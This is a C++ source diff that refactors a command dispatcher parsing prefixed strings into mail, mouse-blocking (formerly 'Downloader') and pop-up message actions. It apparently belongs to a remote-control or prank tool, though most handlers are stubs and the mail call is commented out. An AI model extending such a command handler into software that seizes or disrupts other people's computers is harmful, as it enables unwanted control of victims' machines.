@@ -1,5 +1,5 @@
 #include "command.h"
-#include "sendmail.h"
+
 
 /*Converts command and directs them to proper functions*/
 void Command::execCommand()
@@ -14,28 +14,28 @@ void Command::execCommand()
 	}
 
 	/*V DIRECTOR V*/
-	if (prepos.compare("1$") == 0) //MailSender gets format: 1$title##msg@@addres
+	if (prepos.compare("1$") == 0) //MailSender gets format: 1$title##msg@@address
 	{
 		if (DEBUG)
 			std::cout << "Mailing...\n";
-		//std::string addres = 
-		std::string msg = getMessage(_cmd);
+		std::string address = getAddress(_cmd);
+		std::string msg = getMessage(_cmd, true);
 		std::string title = getTitle(_cmd);
 		if (DEBUG)
-			std::cout << "Title: " << title << "\nMsg: " << msg << std::endl;
+			std::cout << "Title: " << title << "\nMsg: " << msg << "\nAddress: " << address << std::endl;
 		//mail("avix133help@gmail.com", title.c_str(), msg.c_str());
 	}
-	else if (prepos.compare("2$") == 0) //Downloader
+	else if (prepos.compare("2$") == 0) //Mouseblocker
 	{
 		if (DEBUG)
-			std::cout << "Downloading...\n";
+			std::cout << "MouseBlocker...\n";
 	}
 	else if (prepos.compare("3$") == 0) //MessageSender gets format: 3$title##msg
 	{
 		if (DEBUG)
 			std::cout << "Message..\n";
 
-		std::string msg = getMessage(_cmd);
+		std::string msg = getMessage(_cmd, false);
 		std::string title = getTitle(_cmd);
 		
 		MessageBox(NULL, msg.c_str() , title.c_str(), MB_ICONINFORMATION | MB_OKCANCEL);
@@ -47,7 +47,7 @@ void Command::execCommand()
 	}
 
 }
-int Command::getSeparation(std::string cmd)
+int Command::getSeparation(std::string cmd, std::string code)
 {
 std::string temp_str;
 std::string temp_str2;
@@ -57,7 +57,7 @@ std::string temp_str2;
 		{
 			temp_str = cmd.at(i);
 			temp_str2 = cmd.at(i + 1);
-			if (temp_str.compare("#") == 0 && temp_str2.compare("#") == 0)
+			if (temp_str.compare(code) == 0 && temp_str2.compare(code) == 0)
 			{
 				return i;
 			}
@@ -76,27 +76,41 @@ std::string temp_str2;
 
 std::string Command::getTitle(std::string cmd)
 {
-int n;
-	if ((n = getSeparation(cmd)) != 0)
+int separator_pos;
+if ((separator_pos = getSeparation(cmd, "#")) != 0)
 	{
 		if (DEBUG)
-			std::cout << "getTitle returned: " << n << std::endl;
+			std::cout << "getTitle: getSeparation # returned: " << separator_pos << std::endl;
 
-		return cmd.substr(0, n);
+		return cmd.substr(0, separator_pos);
 	}
 	else return cmd;
 }
 
-std::string Command::getMessage(std::string cmd)
+std::string Command::getMessage(std::string cmd, bool address)
 {
-int n;
+int separator_pos; //##
+int address_separator_pos; //@@
 
-	if((n = getSeparation(cmd)) != 0)
+	if((separator_pos = getSeparation(cmd, "#")) != 0)
 	{
-		n += 2; //2 cuz of ##
+		separator_pos += 2; //2 cuz of ##
 		if (DEBUG)
-			std::cout << "getMessage returned: " << n << std::endl;
-		return cmd.substr(n, (cmd.length() - n));
+			std::cout << "getMessage: getSeparation # returned: " << separator_pos << std::endl;
+		if (!address)
+		{
+			return cmd.substr(separator_pos, (cmd.length() - separator_pos));
+		}
+		else
+		{
+			address_separator_pos = getSeparation(cmd, "@");
+			return cmd.substr(separator_pos, address_separator_pos - separator_pos);
+		}
 	}
-	else return cmd;
+	else return cmd; //message = title
+}
+
+std::string Command::getAddress(std::string cmd)
+{
+	return cmd;
 }
